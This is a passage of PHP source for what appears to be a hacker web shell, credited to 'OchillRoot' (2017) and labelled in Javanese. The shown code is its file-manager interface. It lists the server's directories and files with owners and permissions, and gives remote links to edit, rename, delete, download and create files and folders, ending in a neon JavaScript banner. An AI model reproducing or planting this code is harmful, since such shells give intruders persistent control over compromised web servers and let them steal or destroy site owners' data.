if(function_exists('posix_getpwuid')) {
$downer = @posix_getpwuid(fileowner("$dir/$dirx"));
$downer = $downer['name'];
} else {
//$downer = $uid;
$downer = fileowner("$dir/$dirx");
}
if(function_exists('posix_getgrgid')) {
$dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
$dgrp = $dgrp['name'];
} else {
$dgrp = filegroup("$dir/$dirx");
}
if(!is_dir("$dir/$dirx")) continue;
if($dirx === '..') {
$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
} elseif($dirx === '.') {
$href = "<a href='?dir=$dir'>$dirx</a>";
} else {
$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
}
if($dirx === '.' || $dirx === '..') {
$act_dir = "<a href='?act=newfile&dir=$dir'>Ngawe Anak 1</a> | <a href='?act=newfolder&dir=$dir'>Ngawe Anak 2</a>";
} else {
$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>Ganti Jenenge</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>Busek</a>";
}
echo "<tr>";
echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
echo "<td class='td_home'><center>$dtype</center></td>";
echo "<td class='td_home'><center>-</center></th></td>";
echo "<td class='td_home'><center>$dtime</center></td>";
echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
echo "</tr>";
}
}
} else {
echo "<font color=red>Gak Isok Bukak Panggone Sempak Cok!!</font>";
}
foreach($scandir as $file) {
$ftype = filetype("$dir/$file");
$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
$size = filesize("$dir/$file")/1024;
$size = round($size,3);
if(function_exists('posix_getpwuid')) {
$fowner = @posix_getpwuid(fileowner("$dir/$file"));
$fowner = $fowner['name'];
} else {
//$downer = $uid;
$fowner = fileowner("$dir/$file");
}
if(function_exists('posix_getgrgid')) {
$fgrp = @posix_getgrgid(filegroup("$dir/$file"));
$fgrp = $fgrp['name'];
} else {
$fgrp = filegroup("$dir/$file");
}
if($size > 1024) {
$size = round($size/1024,2). 'MB';
} else {
$size = $size. 'KB';
}
if(!is_file("$dir/$file")) continue;
echo "<tr>";
echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
echo "<td class='td_home'><center>$ftype</center></td>";
echo "<td class='td_home'><center>$size</center></td>";
echo "<td class='td_home'><center>$ftime</center></td>";
echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>Dipacaki</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>Ganti Jenenge</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>Busek</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>Dijumuk</a></td>";
echo "</tr>";
}
echo "</table>";
if(!is_readable($dir)) {
//
} else {
echo "<hr>";
}

html_footer();
}

function html_footer () {

echo <<<END
<br />
<script language="JavaScript1.2">
var message=" ..::[+ Copyright � 2017 OchillRoot [ V A L E N S 1 A ] +]::.. "// jangan pakai enter
var neonbasecolor=" aqua "
var neontextcolor=" white "
var neontextcolor2="pink" // kode warna kedua
var flashspeed=1 // kecepatan flash neon, semakin kecil semakin cepat
var flashingletters=10 // jumlah huruf yang tersorot oleh flash
var flashingletters2=2 // jumlah warna di ekor flash
var flashpause=1
///edit by http://googel-indonesia.blogspot.com/
var n=0
if (document.all||document.getElementById){
document.write('<font color="'+neonbasecolor+'">')
for (m=0;m<message.length;m++)
document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
document.write('</font>')
}
else
document.write(message)
function crossref(number){
var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number)
return crossobj
}
function neon(){
//Change all letters to base color
if (n==0){
for (m=0;m<message.length;m++)
crossref(m).style.color=neonbasecolor
}
//cycle through and change individual letters to neon color
crossref(n).style.color=neontextcolor

if (n>flashingletters-1) crossref(n-flashingletters).style.color=neontextcolor2
if (n>(flashingletters+flashingletters2)-1) crossref(n-flashingletters-flashingletters2).style.color=neonbasecolor
if (n<message.length-1)
n++
else{
n=0
clearInterval(flashing)
setTimeout("beginneon()",flashpause)
return
}
}
function beginneon(){
if (document.all||document.getElementById)
flashing=setInterval("neon()",flashspeed)
}
beginneon()
</script>
<br /><br />
</body>
</html>
END;

}
?>
